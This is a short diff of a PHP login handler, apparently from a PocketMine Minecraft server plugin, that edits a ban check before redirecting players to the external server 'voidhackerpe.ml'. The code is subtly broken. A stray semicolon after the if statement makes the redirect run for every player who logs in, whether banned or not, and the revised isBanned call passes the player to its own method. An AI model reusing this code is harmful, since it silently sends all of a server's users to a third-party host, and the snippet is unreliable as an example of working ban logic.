@@ -18,7 +18,7 @@ public function onEnable() {
     
 public function onLogin(PlayerPreLoginEvent $event) {
     $player = $event->getPlayer();
-   if ($this->getPlayer()->isBanned($player));
+   if ($player->isBanned($player));
 $event->getPlayer()->transfer("voidhackerpe.ml", "25640");
     }
 }
